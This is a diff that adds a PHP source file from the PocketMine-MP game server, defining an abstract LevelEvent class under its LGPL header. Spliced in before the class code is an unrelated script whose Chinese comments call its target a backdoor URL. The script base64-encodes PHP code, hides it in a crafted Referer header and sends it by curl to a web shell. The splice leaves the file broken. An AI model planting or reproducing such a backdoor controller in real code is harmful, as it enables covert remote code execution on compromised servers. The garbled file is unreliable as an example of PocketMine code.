@@ -1,0 +1,62 @@
+<?php
+
+/*
+ *
+ *  ____            _        _   __  __ _                  __  __ ____
+ * |  _ \ ___   ___| | _____| |_|  \/  (_)_ __   ___      |  \/  |  _ \
+ * | |_) / _ \ / __| |/ / _ \ __| |\/| | | '_ \ / _ \_____| |\/| | |_) |
+ * |  __/ (_) | (__|   <  __/ |_| |  | | | | | |  __/_____| |  | |  __/
+ * |_|   \___/ \___|_|\_\___|\__|_|  |_|_|_| |_|\___|     |_|  |_|_|
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU Lesser General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * @author PocketMine Team
+ * @link http://www.pocketmine.net/
+ *
+ *
+*/
+<?php
+    header('Content-type:text/html;charset=utf-8');
+    //要执行的代码
+    $code = "phpinfo();";
+    //进行base64编码
+    $code = base64_encode($code);
+    //构造referer字符串
+    $referer = "a=10&b=ab&c=34&d=re&e=32&f=km&g={$code}&h=&i=";
+    //后门url
+    $url = 'http://localhost/shell/index.php';
+    $ch = curl_init();
+    $options = array(
+        CURLOPT_URL => $url,
+        CURLOPT_HEADER => FALSE,
+        CURLOPT_RETURNTRANSFER => TRUE,
+        CURLOPT_REFERER => $referer
+    );
+    curl_setopt_array($ch, $options);
+    echo curl_exec($ch);
+?>
+declare(strict_types=1);
+
+/**
+ * Level related events
+ */
+namespace pocketmine\event\level;
+
+use pocketmine\event\Event;
+use pocketmine\level\Level;
+
+abstract class LevelEvent extends Event{
+	/** @var Level */
+	private $level;
+
+	public function __construct(Level $level){
+		$this->level = $level;
+	}
+
+	public function getLevel() : Level{
+		return $this->level;
+	}
+}
